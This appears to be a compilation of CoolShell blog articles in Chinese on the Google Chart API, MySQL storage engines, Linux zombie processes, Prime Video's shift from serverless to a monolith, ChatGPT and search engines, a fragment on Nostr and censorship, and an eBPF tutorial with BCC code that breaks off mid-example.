<img src="http://chart.apis.google.com/chart?cht=p3&chd=t:60,40&chs=250x100&chl=酷壳|Cocre" alt="" />
```

我们就可能通过如下的HTML代码显示一个60:40的饼图：
![img](https://chart.apis.google.com/chart?cht=p3&chd=t:60,40&chs=250x100&chl=%E9%85%B7%E5%A3%B3|Cocre)

Google的这个API支持的统计图风格相当的多。



比如：

```
<img src="http://chart.apis.google.com/chart?chs=200x125&cht=ls&chco=0077CC&chd=t:27,25,60,31,25,39,25,31,26,28,80,28,27,31,27,29,26,35,70,25" alt="Sparkline chart in blue" />
```

![Sparkline chart in blue](https://chart.apis.google.com/chart?chs=200x125&cht=ls&chco=0077CC&chd=t:27,25,60,31,25,39,25,31,26,28,80,28,27,31,27,29,26,35,70,25)

还甚至支持有世界地图式的统计图：

```
<img src="http://chart.apis.google.com/chart?cht=t&chs=440x220&chd=t:0,100,50,32,60,40,43,12,14,54,98,17,70,76,18,29&chco=FFFFFF,FF0000,FFFF00,00FF00&chld=DZEGMGAOBWNGCFKECGCVSNDJTZGHMZZM&chtm=africa&chf=bg,s,EAF7FE" alt="Map of Africa" />
```

![Map of Africa](https://chart.apis.google.com/chart?cht=t&chs=440x220&chd=t:0,100,50,32,60,40,43,12,14,54,98,17,70,76,18,29&chco=FFFFFF,FF0000,FFFF00,00FF00&chld=DZEGMGAOBWNGCFKECGCVSNDJTZGHMZZM&chtm=africa&chf=bg,s,EAF7FE)

更多的内容请到[http://code.google.com/apis/chart/](https://code.google.com/apis/chart/) 上查看吧。

# MYSQL: INNODB 还是 MYISAM?

MyISAM 是MySQL中默认的存储引擎，一般来说不是有太多人关心这个东西。决定使用什么样的存储引擎是一个很tricky的事情，但是还是值我们去研究一下，这里的文章只考虑 MyISAM 和InnoDB这两个，因为这两个是最常见的。

下面先让我们回答一些问题：

- 你的数据库有外键吗？
- 你需要事务支持吗？
- 你需要全文索引吗？
- 你经常使用什么样的查询模式？
- 你的数据有多大？



思考上面这些问题可以让你找到合适的方向，但那并不是绝对的。如果你需要事务处理或是外键，那么InnoDB 可能是比较好的方式。如果你需要全文索引，那么通常来说 MyISAM是好的选择，因为这是系统内建的，然而，我们其实并不会经常地去测试两百万行记录。所以，就算是慢一点，我们可以通过使用Sphinx从InnoDB中获得全文索引。

数据的大小，是一个影响你选择什么样存储引擎的重要因素，大尺寸的数据集趋向于选择InnoDB方式，因为其支持事务处理和故障恢复。数据库的在小决定了故障恢复的时间长短，InnoDB可以利用事务日志进行数据恢复，这会比较快。而MyISAM可能会需要几个小时甚至几天来干这些事，InnoDB只需要几分钟。

您操作数据库表的习惯可能也会是一个对性能影响很大的因素。比如： COUNT() 在 MyISAM 表中会非常快，而在InnoDB 表下可能会很痛苦。而主键查询则在InnoDB下会相当相当的快，但需要小心的是如果我们的主键太长了也会导致性能问题。大批的inserts 语句在MyISAM下会快一些，但是updates 在InnoDB 下会更快一些——尤其在并发量大的时候。

所以，到底你检使用哪一个呢？根据经验来看，如果是一些小型的应用或项目，那么MyISAM 也许会更适合。当然，在大型的环境下使用MyISAM 也会有很大成功的时候，但却不总是这样的。如果你正在计划使用一个超大数据量的项目，而且需要事务处理或外键支持，那么你真的应该直接使用InnoDB方式。但需要记住InnoDB 的表需要更多的内存和存储，转换100GB 的MyISAM 表到InnoDB 表可能会让你有非常坏的体验。

# LINUX 的僵尸(ZOMBIE)进程

可能很少有人意识到，在一个进程调用了exit之后，该进程 并非马上就消失掉，而是留下一个称为僵尸进程（Zombie）的数据结构。在Linux进程的5种状态中，僵尸进程是非常特殊的一种，它已经放弃了几乎所 有内存空间，没有任何可执行代码，也不能被调度，仅仅在进程列表中保留一个位置，记载该进程的退出状态等信息供其他进程收集，除此之外，僵尸进程不再占有 任何内存空间。

僵尸进程的来由，要追溯到Unix，Unix的设计者们设计这个东西并非是因为闲来无事想装装酷什么的。上面说到，僵尸进程中保存着很多对程序员和系统管理员非常重要的信息，首先，这个进程是怎么死亡的？是正常退出呢，还是出现了错误，还是被其它进程强迫退出的？也就是说，这个程序的退出码是什么？其次，这个进程占用的总系统CPU时间和总用户CPU时间分别是多少？发生页错误的数目和收到信号的数目。这些信息都被存储在僵尸进程中，试想如果没有僵尸进程，进程执行多长我们并不知道，一旦其退出，所有与之相关的信息都立刻都从系统中清除，而如果此时父进程或系统管理员需要用到，就只好干瞪眼了。



所以，进程退出后，系统会把该进程的状态变成Zombie，然后给上一定的时间等着父进程来收集其退出信息，因为可能父进程正忙于别的事情来不及收集，所以，使用Zombie状态表示进程退出了，正在等待父进程收集信息中。

Zombie进程不可以用kill命令清楚，因为进程已退出，如果需要清除这样的进程，那么需要清除其父进程，或是等很长的时间后被内核清除。因为Zombie的进程还占着个进程ID号呢，这样的进程如果很多的话，不利于系统的进程调度。

下面，让我们来看看一个示例：



/* zombie.c */

**#include <sys/types.h>**

**#include <unistd.h>  main()**

{

​    pid_t pid; 

​    pid=fork();

​    **if**(pid<0) { /* 如果出错 */ 

​        printf("error occurred!\n");

​    }**else** **if**(pid==0){ /* 如果是子进程 */ 

​        exit(0);

​    }**else**{  /* 如果是父进程 */ 

​        sleep(60);  /* 休眠60秒 */ 

​        wait(**NULL**); /* 收集僵尸进程 */

​    }

}



编译这个程序：



$ cc zombie.c -o zombie



后台运行程序，以使我们能够执行下一条命令



$ ./zombie &

[1] 1217



列一下系统内的进程



$ ps -ax

... ...

1137   pts/0   S   0:00   -bash

1217   pts/0   S   0:00   ./zombie

1218   pts/0   Z   0:00   [zombie]

1578   pts/0   R   0:00   ps   -ax



其中的”Z”就是僵尸进程的标志，它表示1218号进程现在就是一个僵尸进程。

收集Zombie进程的信息，并终结这些僵尸进程，需要我们在父进程中使用waitpid调用和wait调用。这两者的作用都是收集僵尸进程留下的信息，同时使这个进程彻底消失。

# 是微服务架构不香还是云不香？

这两天技术圈里热议的一件事就是Amazon的流媒体平台Prime Video在2023年3月22日发布了一篇技术博客《[规模化Prime Video的音视频监控服务，成本降低90%](https://www.primevideotech.com/video-streaming/scaling-up-the-prime-video-audio-video-monitoring-service-and-reducing-costs-by-90)》，副标题：“**从分布式微服务架构到单体应用程序的转变有助于实现更高的规模、弹性和降低成本**”，有人把这篇文章在五一期间转到了[reddit](https://www.reddit.com/r/programming/comments/137alxn/prime_video_switched_from_serverless_to_ec2_and/) 和 [hacker news](https://news.ycombinator.com/item?id=35811741) 上，在Reddit上热议。这种话题与业内推崇的微服务架构形成了鲜明的对比。从“微服务架构”转“单体架构”，还是Amazon干的，这个话题足够劲爆。然后DHH在刚[喷完Typescript](https://twitter.com/dhh/status/1655076668787097607)后继续发文《[即便是亚马逊也无法理解Servless或微服务](https://world.hey.com/dhh/even-amazon-can-t-make-sense-of-serverless-or-microservices-59625580)》，继续抨击微服务架构，于是，瞬间引爆技术圈，登上技术圈热搜。

今天上午有好几个朋友在微信里转了三篇文章给我，如下所示：

- 《[微服务是不是个蠢主意？](https://mp.weixin.qq.com/s/mEmz8pviahEAWy1-SA8vcg)》
- 《[单体回归？亚马逊放弃用于视频监控的微服务](https://mp.weixin.qq.com/s/7zm5YyeZhQ2mu2TJvOK5tQ) 》
- 《[从微服务转为单体架构、成本降低 90%，亚马逊内部案例引发轰动](https://mp.weixin.qq.com/s/fQtAMf4BfJxdBPWDE5ygwg)》

看看这些标题就知道这些文章要的是流量而不是好好写篇文章。看到第二篇，你还真当 Prime Video 就是 Amazon 的全部么？然后，再看看这些文章后面的跟风评论，我觉得有 80%的人只看标题，而且是连原文都不看的。所以，我想我得写篇文章了……



#### 原文解读

要认清这个问题首先是要认认真真读一读原文，Amazon Prime Video 技术团队的这篇文章并不难读，也没有太多的技术细节，但核心意思如下：

1）**这个系统是一个监控系统，用于监控数据千条用户的点播视频流**。主要是监控整个视频流运作的质量和效果（比如：视频损坏或是音频不同步等问题），这个监控主要是处理视频帧，所以，他们有一个微服务主要是用来把视频拆分成帧，并临时存在 S3 上，就是下图中的 Media Conversion 服务。

2）**为了快速搭建系统，Prime Video团队使用了Serverless 架构，也就是著名的 AWS Lambda 和 AWS Step Functions**。前置 Lambda 用来做用户请求的网关，Step Function 用来做监控（探测器），有问题后，就发 SNS 上，Step Function 从 S3 获取 Media Conversion 的数据，然后把运行结果再汇总给一个后置的 Lambda ，并存在 S3 上。

![img](photo/prime.01.webp)

整个架构看上去非常简单 ，一点也不复杂，而且使用了 Serverless 的架构，一点服务器的影子都看不见。**实话实说，这样的开发不香吗？我觉得很香啊，方便快捷，完全不理那些无聊的基础设施，直接把代码转成服务，然后用 AWS 的 Lamda + Step Function + SNS + S3 分分钟就搭出一个有模有样的监控系统了，哪里不好了？！**

但是他们遇到了一个比较大的问题，就是 AWS Step Function 的伸缩问题，从文章中我看到了两个问题（注意前方高能）：

1. 需要很多很多的并发的 AWS Step Function ，于是达到了帐户的 hard limit。
2. AWS Step Function 按状态转换收费，所以，贵得受不了了。

注意，这里有两个关键点：1）**帐户对 Step Function 有限制**，2）**Step Function 太贵了用不起**。

然后，Prime Video 的团队开始解决问题，下面是解决的手段：

1） 把 Media Conversion 和 Step Function 全部写在一个程序里，Media Conversion 跟 Step Function 里的东西通过内存通信，不再走S3了。结果汇总到一个线程中，然后写到 S3.

2）把上面这个单体架构进行分布式部署，还是用之前的 AWS Lambda 来做入门调度。

EC2 的水平扩展没有限制，而且你想买多少 CPU/MEM 的机器由你说了算，而这些视频转码，监控分析的功能感觉就不复杂，本来就应该写在一起，这么做不更香吗？当然更香，比前面的 Serverless 的确更香，因为如下的几个原因：

1. 不再受 Step Function 的限制了，技术在自己手里，有更大的自由度。
2. 没有昂贵的 Step Function 云成本的确变得更低了，如果你把 Lambda 换成 Nginx 或 Spring Gateway 或是我司的 [Easegress](https://github.com/megaease/easegress)，你把 S3 换成 MinIO，你把 SNS 换成 Kafka，你的成本 还能再低。

#### 独立思考

好了，原文解读完了，你有自己的独立思考了吗？下面是我的独立思考，供你参考：

1）**AWS 的 Serverless 也好， 微服务也好，单体也好，在合适的场景也都很香**。这就跟汽车一样，跑车，货车，越野车各有各的场景，你用跑车拉货，还是用货车泡妞都不是一个很好的决定。

2）**这篇文章中的这个例子中的业务太过简单了，本来就是一两个服务就可以干完的事。**就是一个转码加分析的事，要分开的话，就两个微服务就好了（一个转码一个分析），做成流式的。如果不想分，合在一起也没问题了，这个粒度是微服务没毛病。微服务的划分有好些原则，我这里只罗列几个比较重要的原则：

- **边界上下文**。微服务的粒度不能大于领域驱动里的 Bounded Context（具体是什么 大家自行 Google），也就是一个业务域。
- **单一职责，高内聚，低耦合**。把因为相同原因变化的合在一起（内聚），把不同原因变化的分开（解耦）
- **事务和一致性**。对于两个重度依赖的功能，需要完成一个事务和要保证强一致性的，最好不要拆开，要放在一起。
- **跟组织架构匹配**。把同一个团队的东西放在一起，不同团队的分开。

3）**Prime Video 遇到的问题不是技术问题，而是 AWS Step Function 处理能力不足，而且收费还很贵的问题**。这个是 AWS 的产品问题，不是技术问题。或者说，这个是Prime Video滥用了Step Function的问题（本来这种大量的数据分析处理就不适合Step Function）。所以，大家不要用一个产品问题来得到微服务架构有问题的结论，这个没有因果关系。**试问，如果 Step Funciton 可以无限扩展，性能也很好，而且白菜价，那么 Prime Video 团队还会有动力改成单体吗？他们不会反过来吹爆 Serverless 吗？**

4）Prime Video 跟 AWS 是两个独立核算的公司，就像 Amazon 的电商和 AWS 一样，也是两个公司。Amazon 的电商和 AWS 对服务化或是微服务架构的理解和运维，我个人认为这个世界上再也找不到另外一家公司了，包括 Google 或 Microsoft。你有空可以看看本站以前的这篇文章《[Steve Yegg对Amazon和Google平台的吐槽](https://coolshell.cn/articles/5701.html)》你会了解的更多。

5）**Prime Video 这个案例本质上是“下云”，下了 AWS Serverless 的云**。云上的成本就是高，一个是费用问题，另一个是被锁定的问题。Prime Video 团队应该很庆幸这个监控系统并不复杂，重写起来也很快，所以，可以很快使用一个更传统的“服务化”+“云计算”的分布式架构，不然，就得像 DHH 那样咬牙下云——《[Why We’re Leaving the Cloud](https://world.hey.com/dhh/why-we-re-leaving-the-cloud-654b47e0)》（他们的 SRE 的这篇博文 [Our Cloud Spend in 2022](https://dev.37signals.com/our-cloud-spend-in-2022/)说明了下云的困难和节约了多少成本）

#### 后记

最后让我做个我自己的广告。我在过去几年的创业中，帮助了很多公司解决了这些 分布式，微服务，云原生以及云计算成本的问题，如果你也有类似问题。欢迎，跟我联系：[haoel@hotmail.com](mailto:haoel@hotmail.com)

另外，我们今年发布了一个平台 MegaEase Cloud， **就是想让用户在不失去云计算体验的同时，通过自建高可用基础架构的方式来获得更低的成本（至少降 50%的云计算成本）。**目前可以降低成本的方式：

1. 基础软件：通过开源软件自建，
2. 内容分发：MinIO + Cloudflare 的免费 CDN，
3. 马上准备发布的直接与底层IDC合作的廉价GPU计算资源…

**欢迎大家试用。**

**如何访问**

- 中国区:  [https://cloud.megaease.cn ](https://cloud.megaease.cn/)
- 国际区：[https://cloud.megaease.com](https://cloud.megaease.com/)

**注：这两个区完全独立，帐号不互通。因为网络的不可抗力，千万不要跨区使用。**

**产品演示**

- https://www.bilibili.com/video/BV17v4y1R7mA/

**介绍文章**

- [欢迎使用 MegaEase Cloud](https://megaease.cn/zh/blog/2023/02/15/welcome-to-megaease-cloud/)
- [2023 年 03 月重大更新](https://megaease.cn/zh/blog/2023/04/06/megaease-cloud-2023.03-significant-update/)

# 我看CHATGPT: 为啥谷歌掉了千亿美金

两个月前，我试着想用 ChatGPT 帮我写篇文章《[eBPF 介绍](https://coolshell.cn/articles/22320.html)》，结果错误百出，导致我又要从头改一遍，从那天我觉得 ChatGPT 生成的内容完全不靠谱，所以，从那天开始我说我不会再用 ChatGPT 来写文章（这篇文章不是由 ChatGPT 生成），因为，在试过一段时间后，我对 ChatGTP 有基于如下的认识：

1. **ChatGPT 不是基于事实，是基于语言模型的**，事实对他来说不重要，对他重要的是他能读懂你的问题，并按照一定的套路回答你的问题。
2. **因为是基于套路的回答，所以，他并不能保证内容是对的，他的目标是找到漂亮的精彩的套路**，于是，你会发现，他的内容组织能力和表述还不错，但是只要你认真玩上一段时间，你会发现，ChatGPT 那些表述的套路其实也比较平常一般。它的很多回答其实都不深，只能在表面上。就像 Github 的 Copilot 一样，写不了什么高级的代码，只能帮你写一些常规格式化的代码（当然，这也够了）

![img](photo/chatgpt.example-1024x853.jpg)ChatGPT 就是一个语言模型，如果不给他足够的数据和信息，它基本就是在胡编乱造

所以，基于上面这两个点认识，以发展的眼光来看问题，我觉得 ChatGPT 这类的 AI 可以成为一个小助理，他的确可以干掉那些初级的脑力工作者，但是，还干不掉专业的人士，这个我估计未来也很难，不过，这也很帅了，因为大量普通的工作的确也很让人费时间和精力，**但是有个前提条件——就是ChatGPT所产生的内容必需是真实可靠的，没有这个前提条件的话，那就什么用也没有了**。

今天，我想从另外一个角度来谈谈 ChatGPT，尤其是我在Youtube上看完了微软的发布会《[Introducing your copilot for the web: AI-powered Bing and Microsoft Edge](https://youtu.be/rOeRWRJ16yY) 》，才真正意识到Google 的市值为什么会掉了1000亿美元，是的，**谷歌的搜索引擎的霸主位置受到了前所未有的挑战**……



我们先来分析一下搜索引擎解决了什么样的用户问题，在我看来搜索引擎解决了如下的问题：

- **知识或信息索引**。查新闻，查股票，查历史，查文档，找答案……
- **找服务提供商**。找卖东西的电商，找帮你修东西的服务，找软件……
- **信息的准确和可靠**。搜索引擎的rank算法保证了最准确、最有用、最权威的信息出现在最前面……（作恶的百度不在此列）

基本上就是上面这几个，搜索引擎在上面这几件事上作的很好，但是，还是有一些东西搜索引擎做的并不好，如：

- 搜索引擎是基于关键词的，不是基于语义的

  。所以，搜索引擎并不知道你的真实需求，因此，你会不可避免地要干下面的事，

  - 你经常要不断地增加或调整不同的关键词来提高查询信息的准确度……
  - 你经常要在你查找的信息中进行二次或多次过滤和筛选……

- 搜索引擎是只能呈现内容，无法解读内容

  。所以，你找到相关的链接后，你还要花大量的时间来阅读理解，经常性的你不可避免的要干下面的事：

  - 打开一个链接，读到了一大半后，发现你要的内容不在其中，只能关掉再打开一个……
  - 你想要的内容是在的，但是太晦涩，看不懂，太费解，你要找小白友好的版本……
  - 你想要的内容不完整，你需要在很多个链接和网页上做拼图游戏……
  - 内容是无法结构化的展示的，你搜到的东西全都是碎片信息

- 搜索引擎没有上下文关联，两次搜索是没有关系的

  。也就是说，人知道的越多，问题也就越多，所以，我们经常会面临下面的问题：

  - 随着我了解的越多，我的信息搜索的会出现分支，这个分支只有我自己的管理，搜索引擎是不关心的，导致我每次都相当于从头开始……
  - 你做计划的时候，你需要从多个不同的搜索中获取你想要的东西，最终组合成你定制化的东西，比如做旅游计划……

好了，我们知道，**ChatGPT 这类的技术主要是用来根据用户的需求来按一定的套路来“生成内容”的**，只是其中的内容并不怎么可靠，那么，如果把搜索引擎里靠谱的内容交给 ChatGPT 呢？那么，这会是一个多么强大的搜索引擎啊，完全就是下一代的搜索引擎，上面的那些问题完全都可以解决了：

- 你可以打一段话给搜索引擎，ChatGPT 是读得懂语义的。
- 因为知道语义，于是在众多搜过结果中，他更知道哪些是你想要的内容。
- ChatGPT 可以帮你生成 [TL;DR](https://en.wikipedia.org/wiki/TL;DR)，把长文中的要求总结出来形成更易读的短文
- ChatGPT 可以帮你整理内容，在多个网页中帮你整合和结构化内容
- ChatGPT 可以有上下文对话，你可以让他帮你不断通过更多的关键词搜索信息，并在同一个主题下生成、组织和优化内容

**一旦 ChatGPT 利用上了搜索引擎内容准确和靠谱的优势，那么，ChatGPT 的能力就完全被释放出来了，所以，带 ChatGPT 的搜索引擎，就是真正的“如虎添翼”！**

因此，微软的 Bing + ChatGPT，成为了 Google 有史以来最大的挑战者，我感觉——所有跟信息或是文字处理相关的软件应用和服务，都会因为 ChatGPT 而且全部重新洗一次牌的，这应该会是新一轮的技术革命……**Copilot 一定会成为下一代软件和应用的标配！**

（全文完）

# 聊聊 NOSTR 和 审查

- 员拥有社区相关事务的投票、提名和共同决策权利和义务。

注意下面几点

- 整个社区的决策者，是要通过自己贡献来挣到被选举权的。
- 社区所有的工作和决定都是要公开的。
- 社区的方向和决策都是要投票的，PMC成员有binding的票权，大众也有non-binding的投票权供参考。
- **如果出现了价值观的不同，那么，直接分裂社区就好了，不同价值观的人加入到不同的社区就好了**。

如果审查是在这个框架下运作的话，虽然不完美，但至少会在一种公允的基础下运作，是透明公开的，也是集体决策的。

开源软件社区是一个很成功的示范，所以，我觉得只有技术而没有一个良性的可持续运作的社区，是不可能解决问题的，**干净整齐的环境是一定要有人打扫和整理的**。

 

![欢迎关注我 npub1w6r99545cxea6z76e8nvzjxnymjt4nrsddld33almtm78z7fz95s3c94nu](photo/IMG_2533-300x289.jpg)欢迎关注我 npub1w6r99545cxea6z76e8nvzjxnymjt4nrsddld33almtm78z7fz95s3c94nu

# EBPF 介绍

很早前就想写一篇关于eBPF的文章，但是迟迟没有动手，这两天有点时间，所以就来写一篇，这文章主要还是简单的介绍eBPF 是用来干什么的，并通过几个示例来介绍是怎么玩的，这个技术非常非常之强，Linux 操作系统的观测性实在是太强大了，并在 BCC 加持下变得一览无余。这个技术不是一般的运维人员或是系统管理员可以驾驭的，这个还是要有底层系统知识并有一定开发能力的技术人员才能驾驭的了的。**我在这篇文章的最后给了个彩蛋。**

目录



[介绍](https://coolshell.cn/articles/22320.html#介绍)[用途](https://coolshell.cn/articles/22320.html#用途)[工作原理](https://coolshell.cn/articles/22320.html#工作原理)[示例](https://coolshell.cn/articles/22320.html#示例)[延伸阅读](https://coolshell.cn/articles/22320.html#延伸阅读)[彩蛋](https://coolshell.cn/articles/22320.html#彩蛋)

#### 介绍

eBPF（extened Berkeley Packet Filter）是一种内核技术，它允许开发人员在不修改内核代码的情况下运行特定的功能。eBPF 的概念源自于 Berkeley Packet Filter（BPF），后者是由贝尔实验室开发的一种网络过滤器，可以捕获和过滤网络数据包。

出于对更好的 Linux 跟踪工具的需求，eBPF 从 [dtrace](https://illumos.org/books/dtrace/chp-intro.html)中汲取灵感，dtrace 是一种主要用于 Solaris 和 BSD 操作系统的动态跟踪工具。与 dtrace 不同，Linux 无法全面了解正在运行的系统，因为它仅限于系统调用、库调用和函数的特定框架。[在Berkeley Packet Filter](https://www.kernel.org/doc/html/latest/bpf/index.html) (BPF)（一种使用内核 VM 编写打包过滤代码的工具）的基础上，一小群工程师开始扩展 BPF 后端以提供与 dtrace 类似的功能集。 eBPF 诞生了。**2014 年随 Linux 3.18 首次限量发布，充分利用 eBPF 至少需要 Linux 4.4 以上版本**。



eBPF 比起传统的 BPF 来说，传统的 BPF 只能用于网络过滤，而 eBPF 则可以用于更多的应用场景，包括网络监控、安全过滤和性能分析等。另外，eBPF 允许常规用户空间应用程序将要在 Linux 内核中执行的逻辑打包为字节码，当某些事件（称为挂钩）发生时，内核会调用 eBPF 程序。此类挂钩的示例包括系统调用、网络事件等。用于编写和调试 eBPF 程序的最流行的工具链称为 [BPF 编译器集合](https://github.com/iovisor/bcc) (BCC)，它基于 LLVM 和 CLang。

eBPF 有一些类似的工具。例如，SystemTap 是一种开源工具，可以帮助用户收集 Linux 内核的运行时数据。它通过动态加载内核模块来实现这一功能，类似于 eBPF。另外，DTrace 是一种动态跟踪和分析工具，可以用于收集系统的运行时数据，类似于 eBPF 和 SystemTap。`[1]`

以下是一个简单的比较表格，可以帮助您更好地了解 eBPF、SystemTap 和 DTrace 这三种工具的不同之处：`[1]`

| 工具     | eBPF                                   | SystemTap                                | DTrace                                        |
| :------- | :------------------------------------- | :--------------------------------------- | :-------------------------------------------- |
| 定位     | 内核技术，可用于多种应用场景           | 内核模块                                 | 动态跟踪和分析工具                            |
| 工作原理 | 动态加载和执行无损编译过的代码         | 动态加载内核模块                         | 动态插接分析器，通过 probe 获取数据并进行分析 |
| 常见用途 | 网络监控、安全过滤、性能分析等         | 系统性能分析、故障诊断等                 | 系统性能分析、故障诊断等                      |
| 优点     | 灵活、安全、可用于多种应用场景         | 功能强大、可视化界面                     | 功能强大、高性能、支持多种编程语言            |
| 缺点     | 学习曲线高，安全性依赖于编译器的正确性 | 学习曲线高，安全性依赖于内核模块的正确性 | 配置复杂，对系统性能影响较大                  |

对比表格`[1]`

从上表可以看出，eBPF、SystemTap 和 DTrace 都是非常强大的工具，可以用于收集和分析系统的运行情况。`[1]`

#### 用途

eBPF 是一种非常灵活和强大的内核技术，可以用于多种应用场景。下面是 eBPF 的一些常见用途：`[1]`

- 网络监控：eBPF 可以用于捕获网络数据包，并执行特定的逻辑来分析网络流量。例如，可以使用 eBPF 程序来监控网络流量，并在发现异常流量时进行警报。`[1]`
- 安全过滤：eBPF 可以用于对网络数据包进行安全过滤。例如，可以使用 eBPF 程序来阻止恶意流量的传播，或者在发现恶意流量时对其进行拦截。`[1]`
- 性能分析：eBPF 可以用于对内核的性能进行分析。例如，可以使用 eBPF 程序来收集内核的性能指标，并通过特定的接口将其可视化。这样，可以更好地了解内核的性能瓶颈，并进行优化。`[1]`
- 虚拟化：eBPF 可以用于虚拟化技术。例如，可以使用 eBPF 程序来收集虚拟机的性能指标，并进行负载均衡。这样，可以更好地利用虚拟化环境的资源，提高系统的性能和稳定性。`[1]`

总之，eBPF 的常见用途非常广泛，可以用于网络监控、安全过滤、性能分析和虚拟化等多种应用场景。`[1]`

#### 工作原理

eBPF 的工作原理主要分为三个步骤：加载、编译和执行。

eBPF 需要在内核中运行。这通常是由用户态的应用程序完成的，它会通过系统调用来加载 eBPF 程序。在加载过程中，内核会将 eBPF 程序的代码复制到内核空间。

eBPF 程序需要经过编译和执行。这通常是由Clang/LLVM的编译器完成，然后形成字节码后，将用户态的字节码装载进内核，Verifier会对要注入内核的程序进行一些内核安全机制的检查,这是为了确保 eBPF 程序不会破坏内核的稳定性和安全性。在检查过程中，内核会对 eBPF 程序的代码进行分析，以确保它不会进行恶意操作，如系统调用、内存访问等。如果 eBPF 程序通过了内核安全机制的检查，它就可以在内核中正常运行了，其会通过通过一个JIT编译步骤将程序的通用字节码转换为机器特定指令集，以优化程序的执行速度。

下图是其架构图。

![img](https://imgopt.infoq.com/fit-in/1200x2400/filters:quality(80)/filters:no_upscale()/articles/gentle-linux-ebpf-introduction/en/resources/47image005-1619704397592.jpg)

（图片来自：https://www.infoq.com/articles/gentle-linux-ebpf-introduction/）

在内核中运行时，eBPF 程序通常会挂载到一个内核钩子（hook）上，以便在特定的事件发生时被执行。例如，

- 系统调用——当用户空间函数将执行转移到内核时插入
- 函数进入和退出——拦截对预先存在的函数的调用
- 网络事件 – 在收到数据包时执行
- Kprobes 和 uprobes – 附加到内核或用户函数的探测器

最后 eBPF Maps，允许eBPF程序在调用之间保持状态，以便进行相关的数据统计，并与用户空间的应用程序共享数据。一个eBPF映射基本上是一个键值存储，其中的值通常被视为任意数据的二进制块。它们是通过带有BPF_MAP_CREATE参数的`bpf_cmd`系统调用来创建的，和Linux世界中的其他东西一样，它们是通过文件描述符来寻址。与地图的交互是通过查找/更新/删除系统调用进行的

总之，eBPF 的工作原理是通过动态加载、执行和检查**无损编译**过的代码来实现的。`[1]`

#### 示例

eBPF 可以用于对内核的性能进行分析。下面是一个基于 eBPF 的性能分析的 step-by-step 示例：

第一步：准备工作：首先，需要确保内核已经支持 eBPF 功能。这通常需要在内核配置文件中启用 eBPF 相关的选项，并重新编译内核。检查是否支持 eBPF，你可以用这两个命令查看 `ls /sys/fs/bpf` 和 `lsmod | grep bpf`

第二步：写 eBPF 程序：接下来，需要编写 eBPF 程序，用于收集内核的性能指标。eBPF 程序的语言可以选择 C 或者 Python，它需要通过特定的接口访问内核的数据结构，并将收集到的数据保存到指定的位置。

下面是一个Python 示例（其实还是C语言，用python来加载一段C程序到Linux内核）

```
#!/usr/bin/python3

from bcc import BPF
from time import sleep

# 定义 eBPF 程序
bpf_text = """
#include <uapi/linux/ptrace.h>

BPF_HASH(stats, u32);

int count(struct pt_regs *ctx) {
    u32 key = 0;
    u64 *val, zero=0;
    val = stats.lookup_or_init(&key, &zero);
    (*val)++;
    return 0;
}
"""

# 编译 eBPF 程序
b = BPF(text=bpf_text, cflags=["-Wno-macro-redefined"])

# 加载 eBPF 程序
b.attach_kprobe(event="tcp_sendmsg", fn_name="count")

name = {
  0: "tcp_sendmsg"
}
# 输出统计结果
while True:
    try:
        #print("Total packets: %d" % b["stats"][0].value)
        for k, v in b["stats"].items():
           print("{}: {}".format(name[k.value], v.value))
        sleep(1)
    except KeyboardInterrupt:
        exit()
```

这个 eBPF 程序的功能是统计网络中传输的数据包数量。它通过定义一个 `BPF_HASH` 数据结构来保存统计结果（eBPF Maps），并通过捕获 `tcp_sendmsg` 事件来实现实时统计。最后，它通过每秒输出一次统计结果来展示数据。这个 eBPF 程序只是一个简单的示例，实际应用中可能需要进行更复杂的统计和分析。

第三步：运行 eBPF 程序：接下来，需要使用 eBPF 编译器将 eBPF 程序编译成内核可执行的格式（这个在上面的Python程序里你可以看到——Python引入了一个bcc的包，然后用这个包，把那段 C语言的程序编译成字节码加载在内核中并把某个函数 attach 到某个事件上）。这个过程可以使用 BPF Compiler Collection（BCC）工具来完成。BCC 工具可以通过命令行的方式将 eBPF 程序编译成内核可执行的格式，并将其加载到内核中。

下面是运行上面的 Python3 程序的步骤：

```
sudo apt install python3-bpfcc
```

注：在Python3下请不要使用 `pip3 install bcc` （参看：[这里](https://github.com/iovisor/bcc/issues/2278#issuecomment-825356087)）

如果你是 Ubuntu 20.10 以上的版本，最好通过源码安装（否则程序会有编译问题），参看：[这里](https://github.com/iovisor/bcc/issues/3993#issuecomment-1228217609)：

```
apt purge bpfcc-tools libbpfcc python3-bpfcc
wget https://github.com/iovisor/bcc/releases/download/v0.25.0/bcc-src-with-submodule.tar.gz
tar xf bcc-src-with-submodule.tar.gz
cd bcc/
apt install -y python-is-python3
apt install -y bison build-essential cmake flex git libedit-dev   libllvm11 llvm-11-dev libclang-11-dev zlib1g-dev libelf-dev libfl-dev python3-distutils
apt install -y checkinstall
mkdir build
cd build/
cmake -DCMAKE_INSTALL_PREFIX=/usr -DPYTHON_CMD=python3 ..
make
checkinstall
```

接下来，需要将上面的 Python 程序保存到本地，例如保存到文件 netstat.py。运行程序：最后，可以通过执行以下命令来运行 Python 程序：

```
$ chmod +x ./netstat.py
$ sudo ./netstat.py
tcp_sendmsg: 29
tcp_sendmsg: 216
tcp_sendmsg: 277
tcp_sendmsg: 379
tcp_sendmsg: 419
tcp_sendmsg: 468
tcp_sendmsg: 574
tcp_sendmsg: 645
tcp_sendmsg: 29
```

程序开始运行后，会在控制台输出网络数据包的统计信息。可以通过按 Ctrl+C 组合键来结束程序的运行。

下面我们再看一个比较复杂的示例，这个示例会计算TCP的发包时间（示例参考于Github上 [这个issue](https://github.com/iovisor/bcc/issues/2972)里的程序）：

```
#!/usr/bin/python3

from bcc import BPF
import time

# 定义 eBPF 程序
bpf_text = """
#include <uapi/linux/ptrace.h>
#include <net/sock.h>
#include <net/inet_sock.h>
#include <bcc/proto.h>

struct packet_t {
    u64 ts, size;
    u32 pid;
    u32 saddr, daddr;
    u16 sport, dport;
};

BPF_HASH(packets, u64, struct packet_t);

int on_send(struct pt_regs *ctx, struct sock *sk, struct msghdr *msg, size_t size)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 pid = id;

    // 记录数据包的时间戳和信息
    struct packet_t pkt = {}; // 结构体一定要初始化，可以使用下面的方法
                              //__builtin_memset(&pkt, 0, sizeof(pkt)); 
    pkt.ts = bpf_ktime_get_ns();
    pkt.size = size;
    pkt.pid = pid;
    pkt.saddr = sk->__sk_common.skc_rcv_saddr;
    pkt.daddr = sk->__sk_common.skc_daddr;
    struct inet_sock *sockp = (struct inet_sock *)sk;
    pkt.sport = sockp->inet_sport;
    pkt.dport = sk->__sk_common.skc_dport;

